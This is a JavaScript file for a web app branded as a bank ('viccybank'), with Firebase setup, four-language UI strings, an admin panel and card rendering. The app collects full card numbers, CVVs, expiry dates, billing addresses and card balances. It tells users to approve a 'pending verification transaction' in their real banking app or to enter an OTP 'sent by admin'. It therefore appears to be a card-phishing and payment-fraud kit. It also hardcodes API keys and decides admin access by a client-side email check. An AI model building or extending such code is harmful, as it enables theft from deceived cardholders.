// ── FIREBASE ──
firebase.initializeApp({
  apiKey:"AIzaSyDLPAktzLmpfNX9XUmw9i_B2P2I3XPwOLs",
  authDomain:"viccybank.firebaseapp.com",
  databaseURL:"https://viccybank-default-rtdb.firebaseio.com",
  projectId:"viccybank",
  storageBucket:"viccybank.firebasestorage.app",
  messagingSenderId:"328465601734",
  appId:"1:328465601734:web:10e00c00286f1b932273c7"
});
var auth = firebase.auth();
var db   = firebase.database();
emailjs.init({publicKey:'UWGqvMxNngR8sNNco'});

// ── EMAIL HELPER ──
// serviceID: 'service_viccy', templateID: 'template_viccy'
// Template variables: {{to_email}}, {{subject}}, {{message}}
function sendEmail(toEmail, title, name, message){
  // user_name = original variable used by template_6f5m0as
  emailjs.send('service_rs826sa','template_6f5m0as',{
    user_name: name||title,
    to_email:  toEmail,
    title:     title,
    name:      name,
    message:   message
  }).then(function(){
    console.log('Email sent to '+toEmail);
  }).catch(function(e){
    console.warn('EmailJS error:',e);
  });
}

// ── CONSTANTS ──
var ADMIN_EMAIL = 'admin@gmail.com';
var ADMINADEX_EMAIL = 'adminadex@gmail.com';
var SYM = {'USD':'$','EUR':'\u20ac','GBP':'\u00a3','NGN':'\u20a6','CAD':'C$','AUD':'A$','JPY':'\u00a5'};
// ── CURRENCY CONVERSION RATES (base: USD) ──
var RATES = {
  'USD': 1.0,
  'EUR': 0.92,
  'GBP': 0.79,
  'NGN': 1630.0,
  'CAD': 1.36,
  'AUD': 1.53
};
function convertCurrency(amount, fromCur, toCur){
  if(fromCur===toCur) return amount;
  var usdAmount = amount / (RATES[fromCur] || 1);
  return usdAmount * (RATES[toCur] || 1);
}


var BRANDS = {
  Visa:{bg:'linear-gradient(135deg,#1a1f71,#2d43a8)',logo:'VISA'},
  Mastercard:{bg:'linear-gradient(135deg,#1a1a1a,#3a3a3a)',logo:'MC'},
  Amex:{bg:'linear-gradient(135deg,#007bc1,#005a8e)',logo:'AMEX'},
  Verve:{bg:'linear-gradient(135deg,#00793a,#005a2b)',logo:'VERVE'},
  Discover:{bg:'linear-gradient(135deg,#f76f20,#c45500)',logo:'DISC'},
  Card:{bg:'linear-gradient(135deg,#444,#222)',logo:'CARD'}
};
var FLAGS = {USA:'🇺🇸',UK:'🇬🇧',Nigeria:'🇳🇬',Germany:'🇩🇪',France:'🇫🇷',Canada:'🇨🇦',Brazil:'🇧🇷',Australia:'🇦🇺',Other:'🌍'};

// ── STATE ──
var currentUser = null;
var userRef = null;
var userData = {};
var addMoneyCardIdx = -1;

// ── HELPERS ──
function $(id){ return document.getElementById(id); }
function sym(){ return SYM[userData.currency||'USD']||'$'; }
function fmtDate(iso){
  if(!iso) return '--';
  var d=new Date(iso);
  return d.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+' \u00b7 '+d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
}
function fmtAmt(n){ return parseFloat(n||0).toFixed(2); }
function notify(uid,msg){
  var k='n'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
  return db.ref('notifications/'+uid+'/'+k).set({message:msg,date:new Date().toISOString(),read:false});
}
function detectBrand(n){
  var d=(n||'').replace(/\D/g,'');
  if(/^4/.test(d)) return 'Visa';
  if(/^5[1-5]/.test(d)) return 'Mastercard';
  if(/^3[47]/.test(d)) return 'Amex';
  if(/^650/.test(d)) return 'Verve';
  if(/^6(?:011|5)/.test(d)) return 'Discover';
  return 'Card';
}

// ── SCREEN ──
function showScreen(name,noPush){
  ['auth-screen','dashboard','admin-panel'].forEach(function(id){
    var el=$(id); if(el) el.classList.remove('visible');
  });
  var el=$(name); if(el) el.classList.add('visible');
  var g=$('globe-btn');
  if(g) g.classList.toggle('show', name!=='auth-screen');
  if(!noPush && name!=='auth-screen'){
    history.pushState({screen:name},'',window.location.pathname+(window.location.search||''));
  }
}

// ── MODALS ──
function openModal(id){ var m=$(id); if(m) m.classList.add('show'); }
function closeModal(id){ var m=$(id); if(m) m.classList.remove('show'); }

// ── TABS ──
function switchTab(tabId,btn,noPush){
  document.querySelectorAll('.tab-page').forEach(function(p){p.classList.remove('active');});
  document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('active');});
  var p=$(tabId); if(p) p.classList.add('active');
  if(btn) btn.classList.add('active');
  if(!noPush){
    history.replaceState({screen:'dashboard',tab:tabId},'',window.location.pathname+(window.location.search||''));
  }
}

// ── ADMIN TABS ──
function switchAdminTab(name){
  ['auth','deposits','codes'].forEach(function(t){
    var tab=$('atab-'+t),con=$('acontent-'+t);
    if(tab) tab.classList.remove('active');
    if(con) con.classList.remove('active');
  });
  var tab=$('atab-'+name),con=$('acontent-'+name);
  if(tab) tab.classList.add('active');
  if(con) con.classList.add('active');
  if(name==='auth') loadAuthTab();
  else if(name==='deposits') loadDepositsTab();
  else loadUsersTab();
}

// ── ACCORDION ──
function toggleAcc(bodyId,arrowId){
  var b=$(bodyId),a=$(arrowId);
  if(!b) return;
  var open=b.style.display==='block';
  b.style.display=open?'none':'block';
  if(a) a.textContent=open?'\u25b6':'\u25bc';
}

// ── DRAWER ──
function openDrawer(){ var d=$('drawer'),o=$('drawer-overlay'); if(d)d.classList.add('open'); if(o)o.classList.add('open'); }
function closeDrawer(){ var d=$('drawer'),o=$('drawer-overlay'); if(d)d.classList.remove('open'); if(o)o.classList.remove('open'); }

// ── LANGUAGE ──
var TRANSLATIONS={
en:{
  welcomeBack:'Welcome Back',tagline:'Secure \u00b7 Reliable \u00b7 Global',
  logIn:'Log In',noAccount:"Don't have an account? Sign Up",
  createAccount:'Create Account',alreadyHave:'Already have an account? Log In',
  surname:'Surname',firstName:'First Name',otherName:'Other Name (optional)',
  phoneNumber:'Phone Number',username:'Username',emailAddr:'Email Address',
  emailAddress:'Email address',password:'Password',passwordMin:'Password (min 8 chars)',
  confirmPassword:'Confirm Password',promoCode:'Promo Code (optional)',
  referralCode:'Referral Code (optional)',selectCountry:'Select Country',
  goodDay:'Good day,',totalBalance:'Total Balance',addMoney:'Add Money',
  withdraw:'Withdraw',account:'Account',cards:'Cards',
  linkedCards:'Linked Cards',addNew:'Add New',
  recentTx:'Recent Transactions',noTx:'No transactions yet',
  receipts:'Receipts',noReceipts:'No receipts yet',sendRequest:'Send / Request',
  verifyNow:'Verify Now',welcomeBonus:'$10 welcome bonus',
  moneyRequests:'\u{1f4e9} Money Requests',
  whatToDo:'What would you like to do?',
  sendMoney:'Send Money',transferDesc:'Transfer money to another account',
  requestMoney:'Request Money',requestDesc:'Ask someone to send you money',
  sendNow:'Send Now',sendRequest2:'Send Request',
  offers:'Offers',accountInfo:'Account Info',settings:'Settings',
  referEarn:'Refer &amp; Earn',logOut:'Log Out',
  notifications:'\ud83d\udd14 Notifications',noNotifs:'No notifications',
  adminPanel:'\ud83d\udd12 Admin Panel',authorization:'Authorization',
  deposits:'\ud83d\udcb0 Deposits',users:'Users',
  attentionNeeded:'Attention Needed',loading:'Loading...',
  authorizedCards:'Authorized Cards',rejectedCards:'Rejected Cards',
  depositReqs:'\ud83d\udcb0 Deposit Requests',depositReqDesc:'Approve or reject user deposit requests',
  changePins:'\ud83d\udd12 Change All PINs',changeAll:'Change All',
  usersByCountry:'Users by Country',logout:'Logout',
  copyAcct:'\ud83d\udccb Copy Account #',generatePin:'\ud83d\udd13 Generate PIN',
  viewCards:'View Linked Cards',viewCardsDesc:'See all your linked bank cards and their status',
  addNewCard:'Add New Card',addNewCardDesc:'Link a new bank card to your account',
  linkCard:'Link Card',billingAddr:'\ud83d\udccd Billing Address',
  linkCardBtn:'Link Card',verifyCard:'\ud83d\udd12 Verify Card',
  appAuth:'\ud83d\udcf1 App Auth',otpCode:'\ud83d\udcb2 OTP Code',
  appAuthDesc:'Open your banking app and authorize the verification',
  openApp:"Open your bank's mobile app",
  findPending:'Find the pending verification transaction',
  approveTap:'Approve it, then tap Done below',
  doneAuth:'Done \u2014 I Authorized It',
  otpDesc:'Enter the OTP code sent by admin',
  submitOtp:'Submit OTP',
  addMoneyTitle:'\u2795 Add Money',
  addMoneyDesc:'Select an authorized card. Deposits require admin approval.',
  submitDeposit:'Submit Deposit Request',
  transferFunds:'\ud83d\udcb8 Transfer Funds',
  selectCard:'Select Card',requestTransfer:'Request Transfer',
  noPending:'No pending requests',language:'\ud83c\udf10 Language',
  contactUs:'Contact Us',howToUse:'How to Use',
  noCards:'No cards linked yet',authorized:'Authorized',
  noAuthCards:'No authorized cards. Link and verify a card first.',
  recipientAcct:'Recipient account number (10 digits)',
  amount:'Amount',yourPin:'Your 4-digit PIN',
  theirAcct:'Their account number (10 digits)',
  amountRequest:'Amount to request',noteOptional:'Note (optional)',
  newPin:'New PIN',cardNumber:'Card Number (16 digits)',
  cardHolder:'Cardholder Name',expiry:'MM/YY',cvv:'CVV',
  streetAddr:'Street Address',city:'City',postcode:'Postcode',
  country:'Country',currentBalance:'Current Card Balance (e.g. 2500.00)',
  amountDeposit:'Amount to deposit',pin:'PIN',
  sendAccounts:'Accounts',sendNav:'Send/Req',refer:'Refer',
  referFriend:'Refer a Friend',
  referDesc:'Share your referral code. Earn $10 per friend who joins.',
  shareCode:'Share Code',earnReferrals:'Earn with Referrals',
  copyCode:'\ud83d\udccb Copy Code',referrals:'Referrals',earned:'Earned',
  claimBonus:'Claim Bonus',setPin:'Set PIN',
  accept:'\u2705 Accept &amp; Pay',decline:'\u274c Decline',
  date:'Date',type:'Type',receipt:'Receipt',time:'Time'
},
es:{
  welcomeBack:'Bienvenido de nuevo',tagline:'Seguro \u00b7 Confiable \u00b7 Global',
  logIn:'Iniciar Sesi\u00f3n',noAccount:'\u00bfNo tienes cuenta? Reg\u00edstrate',
  createAccount:'Crear Cuenta',alreadyHave:'\u00bfYa tienes cuenta? Inicia sesi\u00f3n',
  surname:'Apellido',firstName:'Nombre',otherName:'Otro nombre (opcional)',
  phoneNumber:'Tel\u00e9fono',username:'Usuario',emailAddr:'Correo electr\u00f3nico',
  emailAddress:'Correo electr\u00f3nico',password:'Contrase\u00f1a',passwordMin:'Contrase\u00f1a (m\u00edn. 8)',
  confirmPassword:'Confirmar contrase\u00f1a',promoCode:'C\u00f3digo promo (opcional)',
  referralCode:'C\u00f3digo de referido (opcional)',selectCountry:'Seleccionar pa\u00eds',
  goodDay:'Buenos d\u00edas,',totalBalance:'Saldo Total',addMoney:'Agregar dinero',
  withdraw:'Retirar',account:'Cuenta',cards:'Tarjetas',
  linkedCards:'Tarjetas vinculadas',addNew:'Agregar',
  recentTx:'Transacciones recientes',noTx:'Sin transacciones a\u00fan',
  receipts:'Recibos',noReceipts:'Sin recibos a\u00fan',sendRequest:'Enviar / Solicitar',
  verifyNow:'Verificar ahora',welcomeBonus:'Bono de $10',
  moneyRequests:'\ud83d\udce9 Solicitudes de dinero',
  whatToDo:'\u00bfQu\u00e9 deseas hacer?',
  sendMoney:'Enviar dinero',transferDesc:'Transferir a otra cuenta',
  requestMoney:'Solicitar dinero',requestDesc:'Pide a alguien que te env\u00ede dinero',
  sendNow:'Enviar ahora',sendRequest2:'Enviar solicitud',
  offers:'Ofertas',accountInfo:'Info de cuenta',settings:'Configuraci\u00f3n',
  referEarn:'Referir &amp; Ganar',logOut:'Cerrar sesi\u00f3n',
  notifications:'\ud83d\udd14 Notificaciones',noNotifs:'Sin notificaciones',
  adminPanel:'\ud83d\udd12 Panel Admin',authorization:'Autorizaci\u00f3n',
  deposits:'\ud83d\udcb0 Dep\u00f3sitos',users:'Usuarios',
  attentionNeeded:'Atenci\u00f3n requerida',loading:'Cargando...',
  authorizedCards:'Tarjetas autorizadas',rejectedCards:'Tarjetas rechazadas',
  depositReqs:'\ud83d\udcb0 Solicitudes de dep\u00f3sito',depositReqDesc:'Aprobar o rechazar dep\u00f3sitos',
  changePins:'\ud83d\udd12 Cambiar todos los PINs',changeAll:'Cambiar todo',
  usersByCountry:'Usuarios por pa\u00eds',logout:'Cerrar sesi\u00f3n',
  copyAcct:'\ud83d\udccb Copiar cuenta',generatePin:'\ud83d\udd13 Generar PIN',
  viewCards:'Ver tarjetas vinculadas',viewCardsDesc:'Ver tarjetas autorizadas y pendientes',
  addNewCard:'Nueva tarjeta',addNewCardDesc:'Vincular nueva tarjeta',
  linkCard:'Vincular tarjeta',billingAddr:'\ud83d\udccd Direcci\u00f3n de facturaci\u00f3n',
  linkCardBtn:'Vincular',verifyCard:'\ud83d\udd12 Verificar tarjeta',
  appAuth:'\ud83d\udcf1 Auth en app',otpCode:'\ud83d\udcb2 C\u00f3digo OTP',
  appAuthDesc:'Abre tu app bancaria y autoriza la verificaci\u00f3n',
  openApp:'Abre la app de tu banco',
  findPending:'Encuentra la transacci\u00f3n pendiente',
  approveTap:'Ap\u00faebala, luego toca Listo',
  doneAuth:'Listo \u2014 Ya autorice\u0301',
  otpDesc:'Ingresa el OTP enviado por el admin',
  submitOtp:'Enviar OTP',
  addMoneyTitle:'\u2795 Agregar dinero',
  addMoneyDesc:'Selecciona tarjeta autorizada. Los dep\u00f3sitos requieren aprobaci\u00f3n.',
  submitDeposit:'Enviar solicitud de dep\u00f3sito',
  transferFunds:'\ud83d\udcb8 Transferir fondos',
  selectCard:'Seleccionar tarjeta',requestTransfer:'Solicitar transferencia',
  noPending:'Sin solicitudes pendientes',language:'\ud83c\udf10 Idioma',
  contactUs:'Cont\u00e1ctanos',howToUse:'C\u00f3mo usar',
  noCards:'Sin tarjetas vinculadas',authorized:'Autorizada',
  noAuthCards:'Sin tarjetas autorizadas. Vincula una primero.',
  recipientAcct:'N\u00famero de cuenta (10 d\u00edgitos)',
  amount:'Monto',yourPin:'Tu PIN de 4 d\u00edgitos',
  theirAcct:'N\u00famero de cuenta (10 d\u00edgitos)',
  amountRequest:'Monto a solicitar',noteOptional:'Nota (opcional)',
  newPin:'Nuevo PIN',cardNumber:'N\u00famero de tarjeta (16 d\u00edgitos)',
  cardHolder:'Titular de la tarjeta',expiry:'MM/AA',cvv:'CVV',
  streetAddr:'Direcci\u00f3n',city:'Ciudad',postcode:'C\u00f3digo postal',
  country:'Pa\u00eds',currentBalance:'Saldo actual de la tarjeta (ej. 2500.00)',
  amountDeposit:'Monto a depositar',pin:'PIN',
  sendAccounts:'Cuentas',sendNav:'Env/Sol',refer:'Referir',
  referFriend:'Referir a un amigo',
  referDesc:'Comparte tu c\u00f3digo. Gana $10 por cada amigo.',
  shareCode:'Compartir c\u00f3digo',earnReferrals:'Gana con referidos',
  copyCode:'\ud83d\udccb Copiar c\u00f3digo',referrals:'Referidos',earned:'Ganado',
  claimBonus:'Reclamar bono',setPin:'Establecer PIN',
  accept:'\u2705 Aceptar &amp; Pagar',decline:'\u274c Rechazar',
  date:'Fecha',type:'Tipo',receipt:'Recibo',time:'Hora'
},
fr:{
  welcomeBack:'Bon retour',tagline:'S\u00e9curis\u00e9 \u00b7 Fiable \u00b7 Global',
  logIn:'Se connecter',noAccount:"Pas de compte ? S'inscrire",
  createAccount:'Cr\u00e9er un compte',alreadyHave:"D\u00e9j\u00e0 un compte ? Se connecter",
  surname:'Nom de famille',firstName:'Pr\u00e9nom',otherName:'Autre nom (facultatif)',
  phoneNumber:'T\u00e9l\u00e9phone',username:"Nom d'utilisateur",emailAddr:'Adresse e-mail',
  emailAddress:'Adresse e-mail',password:'Mot de passe',passwordMin:'Mot de passe (min 8)',
  confirmPassword:'Confirmer le mot de passe',promoCode:'Code promo (facultatif)',
  referralCode:'Code de parrainage (facultatif)',selectCountry:'S\u00e9lectionner un pays',
  goodDay:'Bonjour,',totalBalance:'Solde total',addMoney:"Ajouter de l'argent",
  withdraw:'Retirer',account:'Compte',cards:'Cartes',
  linkedCards:'Cartes li\u00e9es',addNew:'Ajouter',
  recentTx:'Transactions r\u00e9centes',noTx:'Aucune transaction',
  receipts:'Re\u00e7us',noReceipts:'Aucun re\u00e7u',sendRequest:'Envoyer / Demander',
  verifyNow:'V\u00e9rifier maintenant',welcomeBonus:'Bonus de 10$',
  moneyRequests:'\ud83d\udce9 Demandes d\'argent',
  whatToDo:'Que voulez-vous faire ?',
  sendMoney:"Envoyer de l'argent",transferDesc:'Transf\u00e9rer vers un autre compte',
  requestMoney:"Demander de l'argent",requestDesc:"Demandez \u00e0 quelqu'un de vous envoyer",
  sendNow:'Envoyer maintenant',sendRequest2:'Envoyer la demande',
  offers:'Offres',accountInfo:'Infos du compte',settings:'Param\u00e8tres',
  referEarn:'Parrainer &amp; Gagner',logOut:'D\u00e9connexion',
  notifications:'\ud83d\udd14 Notifications',noNotifs:'Aucune notification',
  adminPanel:'\ud83d\udd12 Panneau Admin',authorization:'Autorisation',
  deposits:'\ud83d\udcb0 D\u00e9p\u00f4ts',users:'Utilisateurs',
  attentionNeeded:'Attention requise',loading:'Chargement...',
  authorizedCards:'Cartes autoris\u00e9es',rejectedCards:'Cartes rejet\u00e9es',
  depositReqs:'\ud83d\udcb0 Demandes de d\u00e9p\u00f4t',depositReqDesc:'Approuver ou rejeter les d\u00e9p\u00f4ts',
  changePins:'\ud83d\udd12 Changer tous les PINs',changeAll:'Tout changer',
  usersByCountry:'Utilisateurs par pays',logout:'D\u00e9connexion',
  copyAcct:'\ud83d\udccb Copier le num\u00e9ro',generatePin:'\ud83d\udd13 G\u00e9n\u00e9rer PIN',
  viewCards:'Voir les cartes li\u00e9es',viewCardsDesc:'Voir vos cartes autoris\u00e9es',
  addNewCard:'Nouvelle carte',addNewCardDesc:'Lier une nouvelle carte',
  linkCard:'Lier la carte',billingAddr:'\ud83d\udccd Adresse de facturation',
  linkCardBtn:'Lier',verifyCard:'\ud83d\udd12 V\u00e9rifier la carte',
  appAuth:'\ud83d\udcf1 Auth app',otpCode:'\ud83d\udcb2 Code OTP',
  appAuthDesc:"Ouvrez votre app bancaire et autorisez la v\u00e9rification",
  openApp:"Ouvrez l'app de votre banque",
  findPending:'Trouvez la transaction en attente',
  approveTap:'Approuvez-la, puis appuyez sur Termin\u00e9',
  doneAuth:"Termin\u00e9 \u2014 J'ai autoris\u00e9",
  otpDesc:"Entrez l'OTP envoy\u00e9 par l'admin",
  submitOtp:"Soumettre l'OTP",
  addMoneyTitle:"\u2795 Ajouter de l'argent",
  addMoneyDesc:'S\u00e9lectionnez une carte autoris\u00e9e. Les d\u00e9p\u00f4ts n\u00e9cessitent approbation.',
  submitDeposit:'Soumettre la demande',
  transferFunds:'\ud83d\udcb8 Transf\u00e9rer des fonds',
  selectCard:'S\u00e9lectionner une carte',requestTransfer:'Demander un transfert',
  noPending:'Aucune demande en attente',language:'\ud83c\udf10 Langue',
  contactUs:'Nous contacter',howToUse:'Comment utiliser',
  noCards:'Aucune carte li\u00e9e',authorized:'Autoris\u00e9e',
  noAuthCards:"Aucune carte autoris\u00e9e. Liez une carte d'abord.",
  recipientAcct:'Num\u00e9ro de compte (10 chiffres)',
  amount:'Montant',yourPin:'Votre PIN \u00e0 4 chiffres',
  theirAcct:'Num\u00e9ro de compte (10 chiffres)',
  amountRequest:'\u00c0 demander',noteOptional:'Note (facultatif)',
  newPin:'Nouveau PIN',cardNumber:'Num\u00e9ro de carte (16 chiffres)',
  cardHolder:'Titulaire de la carte',expiry:'MM/AA',cvv:'CVV',
  streetAddr:'Adresse',city:'Ville',postcode:'Code postal',
  country:'Pays',currentBalance:'Solde actuel de la carte (ex. 2500.00)',
  amountDeposit:'\u00c0 d\u00e9poser',pin:'PIN',
  sendAccounts:'Comptes',sendNav:'Env/Dem',refer:'Parrainer',
  referFriend:'Parrainer un ami',
  referDesc:'Partagez votre code. Gagnez 10$ par ami.',
  shareCode:'Partager le code',earnReferrals:'Gagnez avec les parrainages',
  copyCode:'\ud83d\udccb Copier le code',referrals:'Filleuls',earned:'Gagn\u00e9',
  claimBonus:'R\u00e9clamer le bonus',setPin:'D\u00e9finir PIN',
  accept:'\u2705 Accepter &amp; Payer',decline:'\u274c Refuser',
  date:'Date',type:'Type',receipt:'Re\u00e7u',time:'Heure'
},
pt:{
  welcomeBack:'Bem-vindo de volta',tagline:'Seguro \u00b7 Confi\u00e1vel \u00b7 Global',
  logIn:'Entrar',noAccount:'N\u00e3o tem conta? Cadastre-se',
  createAccount:'Criar conta',alreadyHave:'J\u00e1 tem conta? Entrar',
  surname:'Sobrenome',firstName:'Nome',otherName:'Outro nome (opcional)',
  phoneNumber:'Telefone',username:'Usu\u00e1rio',emailAddr:'Endere\u00e7o de e-mail',
  emailAddress:'Endere\u00e7o de e-mail',password:'Senha',passwordMin:'Senha (m\u00edn. 8)',
  confirmPassword:'Confirmar senha',promoCode:'C\u00f3digo promo (opcional)',
  referralCode:'C\u00f3digo de indica\u00e7\u00e3o (opcional)',selectCountry:'Selecionar pa\u00eds',
  goodDay:'Bom dia,',totalBalance:'Saldo total',addMoney:'Adicionar dinheiro',
  withdraw:'Sacar',account:'Conta',cards:'Cart\u00f5es',
  linkedCards:'Cart\u00f5es vinculados',addNew:'Adicionar',
  recentTx:'Transa\u00e7\u00f5es recentes',noTx:'Sem transa\u00e7\u00f5es ainda',
  receipts:'Recibos',noReceipts:'Sem recibos ainda',sendRequest:'Enviar / Solicitar',
  verifyNow:'Verificar agora',welcomeBonus:'B\u00f4nus de $10',
  moneyRequests:'\ud83d\udce9 Solicita\u00e7\u00f5es de dinheiro',
  whatToDo:'O que voc\u00ea quer fazer?',
  sendMoney:'Enviar dinheiro',transferDesc:'Transferir para outra conta',
  requestMoney:'Solicitar dinheiro',requestDesc:'Pe\u00e7a a algu\u00e9m que te envie',
  sendNow:'Enviar agora',sendRequest2:'Enviar solicita\u00e7\u00e3o',
  offers:'Ofertas',accountInfo:'Informa\u00e7\u00f5es da conta',settings:'Configura\u00e7\u00f5es',
  referEarn:'Indicar &amp; Ganhar',logOut:'Sair',
  notifications:'\ud83d\udd14 Notifica\u00e7\u00f5es',noNotifs:'Sem notifica\u00e7\u00f5es',
  adminPanel:'\ud83d\udd12 Painel Admin',authorization:'Autoriza\u00e7\u00e3o',
  deposits:'\ud83d\udcb0 Dep\u00f3sitos',users:'Usu\u00e1rios',
  attentionNeeded:'Aten\u00e7\u00e3o necess\u00e1ria',loading:'Carregando...',
  authorizedCards:'Cart\u00f5es autorizados',rejectedCards:'Cart\u00f5es rejeitados',
  depositReqs:'\ud83d\udcb0 Solicita\u00e7\u00f5es de dep\u00f3sito',depositReqDesc:'Aprovar ou rejeitar dep\u00f3sitos',
  changePins:'\ud83d\udd12 Alterar todos os PINs',changeAll:'Alterar tudo',
  usersByCountry:'Usu\u00e1rios por pa\u00eds',logout:'Sair',
  copyAcct:'\ud83d\udccb Copiar conta',generatePin:'\ud83d\udd13 Gerar PIN',
  viewCards:'Ver cart\u00f5es vinculados',viewCardsDesc:'Veja seus cart\u00f5es autorizados',
  addNewCard:'Novo cart\u00e3o',addNewCardDesc:'Vincular novo cart\u00e3o',
  linkCard:'Vincular cart\u00e3o',billingAddr:'\ud83d\udccd Endere\u00e7o de cobran\u00e7a',
  linkCardBtn:'Vincular',verifyCard:'\ud83d\udd12 Verificar cart\u00e3o',
  appAuth:'\ud83d\udcf1 Auth app',otpCode:'\ud83d\udcb2 C\u00f3digo OTP',
  appAuthDesc:'Abra seu app banc\u00e1rio e autorize a verifica\u00e7\u00e3o',
  openApp:'Abra o app do seu banco',
  findPending:'Encontre a transa\u00e7\u00e3o pendente',
  approveTap:'Aprove, depois toque em Conclu\u00eddo',
  doneAuth:'Conclu\u00eddo \u2014 J\u00e1 autorizei',
  otpDesc:'Digite o OTP enviado pelo admin',
  submitOtp:'Enviar OTP',
  addMoneyTitle:'\u2795 Adicionar dinheiro',
  addMoneyDesc:'Selecione um cart\u00e3o autorizado. Dep\u00f3sitos requerem aprova\u00e7\u00e3o.',
  submitDeposit:'Enviar solicita\u00e7\u00e3o',
  transferFunds:'\ud83d\udcb8 Transferir fundos',
  selectCard:'Selecionar cart\u00e3o',requestTransfer:'Solicitar transfer\u00eancia',
  noPending:'Sem solicita\u00e7\u00f5es pendentes',language:'\ud83c\udf10 Idioma',
  contactUs:'Fale conosco',howToUse:'Como usar',
  noCards:'Sem cart\u00f5es vinculados',authorized:'Autorizado',
  noAuthCards:'Sem cart\u00f5es autorizados. Vincule um primeiro.',
  recipientAcct:'N\u00famero da conta (10 d\u00edgitos)',
  amount:'Valor',yourPin:'Seu PIN de 4 d\u00edgitos',
  theirAcct:'N\u00famero da conta (10 d\u00edgitos)',
  amountRequest:'Valor a solicitar',noteOptional:'Nota (opcional)',
  newPin:'Novo PIN',cardNumber:'N\u00famero do cart\u00e3o (16 d\u00edgitos)',
  cardHolder:'Titular do cart\u00e3o',expiry:'MM/AA',cvv:'CVV',
  streetAddr:'Endere\u00e7o',city:'Cidade',postcode:'CEP',
  country:'Pa\u00eds',currentBalance:'Saldo banc\u00e1rio atual (ex. 2500.00)',
  amountDeposit:'Valor a depositar',pin:'PIN',
  sendAccounts:'Contas',sendNav:'Env/Sol',refer:'Indicar',
  referFriend:'Indicar um amigo',
  referDesc:'Compartilhe seu c\u00f3digo. Ganhe $10 por amigo.',
  shareCode:'Compartilhar c\u00f3digo',earnReferrals:'Ganhe com indica\u00e7\u00f5es',
  copyCode:'\ud83d\udccb Copiar c\u00f3digo',referrals:'Indica\u00e7\u00f5es',earned:'Ganho',
  claimBonus:'Resgatar b\u00f4nus',setPin:'Definir PIN',
  accept:'\u2705 Aceitar &amp; Pagar',decline:'\u274c Recusar',
  date:'Data',type:'Tipo',receipt:'Comprovante',time:'Hora'
}
};

function tr(k){
  var lang=window._currentLang||'en';
  return (TRANSLATIONS[lang]&&TRANSLATIONS[lang][k])||TRANSLATIONS.en[k]||k;
}

function applyTranslations(){
  document.querySelectorAll('[data-i18n]').forEach(function(el){
    var k=el.getAttribute('data-i18n');
    var v=tr(k);
    if(el.tagName==='INPUT'||el.tagName==='TEXTAREA'){el.placeholder=v;}
    else{el.textContent=v;}
  });
}

function setLang(code,el){
  window._currentLang=code;
  document.querySelectorAll('.lang-opt').forEach(function(o){o.classList.remove('active');});
  if(el)el.classList.add('active');
  applyTranslations();
  closeModal('language-modal');
}

// ── ACCOUNT NUMBER GENERATOR ──
function genAccNum(){
  return new Promise(function(resolve){
    (function tryIt(){
      var n=String(Math.floor(1000000000+Math.random()*9000000000));
      db.ref('accountNumbers/'+n).once('value').then(function(s){ if(s.exists()) tryIt(); else resolve(n); });
    })();
  });
}

// ── FIREBASE AUTH STATE ──
auth.onAuthStateChanged(function(user){
  if(!user){ showScreen('auth-screen'); return; }
  currentUser=user;
  userRef=db.ref('users/'+user.uid);

  userRef.on('value',function(snap){
    userData=snap.val()||{};
    var s=sym();
    var bal=parseFloat(userData.balance||0);
    var an=userData.accountNumber||'';
    var el;
    el=$('balance'); if(el) el.textContent=bal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
    el=$('currency-symbol'); if(el) el.textContent=s;
    el=$('acct-badge'); if(el) el.textContent=an?('....'+an.slice(-4)):'....';
    el=$('topbar-name'); if(el) el.textContent=userData.firstname||'User';
    // Verified = has at least one authorized card AND verified flag is true
    var hasAuthCard=(userData.linkedCards||[]).some(function(cd){return cd&&cd.status==='authorized';});
    if(userData.verified&&!hasAuthCard){
      db.ref('users/'+currentUser.uid+'/verified').set(false);
      userData.verified=false;
    }
    el=$('verified-badge'); if(el) el.style.display=(userData.verified&&hasAuthCard)?'inline':'none';
    el=$('drawer-name'); if(el) el.textContent=(userData.firstname||'')+' '+(userData.surname||'');
    el=$('drawer-email'); if(el) el.textContent=userData.email||'';
    var cards=userData.linkedCards||[];
    var hasAuth=cards.some(function(c){return c&&c.status==='authorized';});
    el=$('verify-banner'); if(el) el.classList.remove('show');
    renderCards(cards);
    renderTx(userData.history||[]);
    renderReferral();
    renderAccountInfo();
    if(user.email===ADMIN_EMAIL){
      showScreen('admin-panel');
      loadAuthTab(); loadDepositsTab(); loadUsersTab();
    } else if(user.email===ADMINADEX_EMAIL){
      showScreen('admin-panel');
      loadAuthTab(); loadDepositsTab(); loadUsersTab();
    } else {
      showScreen('dashboard',true);
      history.replaceState({screen:'dashboard',tab:'tab-home'},'',window.location.pathname+(window.location.search||''));
    }
  });

  db.ref('notifications/'+user.uid).on('value',function(snap){
    var all=[];
    if(snap.exists()) snap.forEach(function(s){all.push(Object.assign({},s.val(),{id:s.key}));});
    all.sort(function(a,b){return new Date(b.date)-new Date(a.date);});
    var unread=all.filter(function(n){return !n.read;}).length;
    var badge=$('notif-badge');
    if(badge){badge.textContent=unread>9?'9+':unread; badge.classList.toggle('show',unread>0);}
    renderNotifications(all);
  });

  db.ref('moneyRequests/'+user.uid).on('value',function(snap){
    var pending=[];
    if(snap.exists()) snap.forEach(function(s){var r=s.val();if(r&&r.status==='pending')pending.push(r);});
    var banner=$('req-banner'),badge=$('req-count-badge');
    if(banner) banner.classList.toggle('show',pending.length>0);
    if(badge) badge.textContent=pending.length+' pending';
    renderMoneyRequests(pending);
  });
});

// ── RENDER CARDS ──
function renderCards(cards){
  var con=$('cards-container'); if(!con) return;
  con.innerHTML='';
  var valid=(cards||[]).filter(function(c){return c;});
  if(!valid.length){
    con.innerHTML='<div style="text-align:center;padding:20px 0;"><div style="font-size:36px;margin-bottom:8px;">'+'\u{1f4b3}'+'</div><div style="color:#999;font-size:14px;">No cards linked yet</div></div>';
    return;
  }
  var stackH=valid.length>1?(105+(valid.length-1)*28):105;
  var wrap=document.createElement('div');
  wrap.className='cards-stack-wrap';
  wrap.style.height=stackH+'px';
  valid.forEach(function(card,idx){
    var cfg=BRANDS[card.brand]||BRANDS.Card;
    var isTop=idx===valid.length-1;
    var sc=card.status==='authorized'?'rgba(52,211,153,0.3)':card.status==='rejected'?'rgba(255,92,92,0.3)':'rgba(255,193,7,0.3)';
